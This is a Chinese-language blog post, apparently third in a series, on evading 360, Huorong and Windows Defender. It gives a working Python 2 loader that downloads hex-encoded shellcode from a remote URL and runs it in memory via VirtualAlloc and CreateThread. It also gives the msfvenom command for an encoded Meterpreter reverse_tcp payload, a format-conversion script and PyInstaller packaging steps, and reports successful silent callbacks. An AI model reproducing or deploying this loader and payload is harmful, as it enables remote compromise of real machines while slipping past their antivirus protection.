# MSF免杀360+火绒上线(三)


<meta name="referrer" content="no-referrer" />

## 前言

这是一个免杀系列文章。

因为自己二进制方面就是个弟弟，所以并不敢冒然称之为教程，只是记录自己在免杀过程中的各种坑以及效果对比。

其实各种办法已经在大佬们的文章中多多少少都有提到过，但是大多数都是讲述一下思路后一笔带过，然而实现的过程中往往会有各种坑。所以想着写一个系列文章，能够让像我这样的WEB选手可以用最简单的办法快速BypassAV。

记录的过程也是自己提高的过程，如果有好的思路可以联系我跟我一起交流，如果有说的不对的地方还望不吝赐教。

本文主要讲利用远程shellcode加载器实现文件不落地免杀。

## 正文

看了倾旋大佬[静态恶意代码逃逸](https://payloads.online/archivers/2019-11-10/1)系列文章后也想写一个自己的shellcode加载器，但是觉得实际中其实不需要专门起一个服务来连接msf生成shellcode，作为本人来说shellcode也不需要天天换，手工生成就可以了。

后来又看到了K8大佬的[文章](https:_www.cnblogs.com_k8gege_p_11223393)，采用的是py+命令行传入hex编码后的shellcode实现文件不落地免杀。

但是本人觉得命令行传入一长串东西不太方便，因为如果进行多重编码处理后的shellcode会变得比较大，理想的办法是把shellcode放到一个地方来远程加载，这也是本文的思路。

### 测试环境

系统环境：kali，win7 (x64)，win10(x64)

测试杀软： 360+火绒+defender 防护全开

免杀工具： msfvenom pyinstaller

注：为了模拟真实环境，360跟火绒全部开启文件云上传。

文中测试方法如果没有特殊说明均为防护状态全开情况下静默上线。

### 源码

采用的py来作为加载器，魔改了一下k8的脚本，使用requests模块来访问远程资源，实现shellcode的加载。

**注意运行环境为python2**

remote.py

```
import ctypes
import sys
import requests
result=requests.get(url=sys.argv[1]).text.strip('\n')
shellcode=bytearray(result.decode("hex"))
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
  
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
  
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))
  
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))
  
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
```

### 编译中的坑

#### 必须用py2的pyinstaller打包

再说一遍这是py2写的，因为py3对于str跟byte的转换很麻烦

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900420020-c29de3d0-95db-4189-875a-af1ba06f3e98.png)

所以我们打包的时候也必须用python2的pyinstaller来打包。

这里就有坑了，如何区分py2的pyinstaller跟py3的pyinstaller。

我本机是python2跟3都用pip装了pyinstaller，直接在命令行下输入pyinstaller打包会默认是3的版本。

我的办法是找到3的script目录下，把3的pyinstaller.exe重命名为pyinstaller3.exe，这样就可以把2跟3的打包分开了。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900420109-9d4ac44d-2881-4fde-bbfe-03668d433321.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900420197-4b283220-4296-4bf3-91be-9383b5b65353.png)

#### 不能有多余换行

shellcode可以放在你的vps上，为了方便我是直接放在github上。

测试的时候一直出现这个错误，后来查了一下才知道是放shellcode的时候最后多了一个换行。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900420285-2f1a56a7-7175-41ba-90a6-ae785494af2a.png)

正确做法是粘贴好shellcode后显示文件只有一行

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900420376-36a1151c-a2ce-4c98-a987-8c0f404dded6.png)

### 使用方法

首先msf生成shellcode

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.145.128  LPORT=443 -e x86/shikata_ga_nai -i 2 -f py -b '\x00'
```

然后需要转换一下格式，2跟3运行均可

format.py

```
buf =xxxxxx 你的shellcode
import binascii  
print(binascii.b2a_hex(buf).decode())
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900420489-84fd336e-7920-4b71-be3b-b8eb6d6fb414.png)

再把shellcode放到你的github上，注意上面提到的坑

然后找到raw，复制地址。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900420583-d7c70106-3b8d-42ef-b038-c7aa0821745c.png)

运行命令

```
remote.exe http://xxxxx/shellcode.txt
```

### 本机win10上线测试

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900420678-f1315c12-0068-4589-9068-0c755a212d34.png)

### win7 360+火绒上线测试

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900420798-63babdfd-e081-4894-9e34-174da240db65.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900420892-fd1abc1b-80bc-4a17-abe3-b7b820e63dbb.png)

### defender上线测试

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900420988-7129c8ca-708e-4bb6-9a60-7191c39e1433.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900421080-f4463b5a-0f86-4f28-8479-8c9ec5bb93fb.png)

## 最后

测试结果还是比较满意的，并且远程加载可以随意变换payload，不需要换了C2就得重新做免杀。

文中的hex只是一个例子，你还可以加一层base64之类的，这个就看大家自己发挥了。


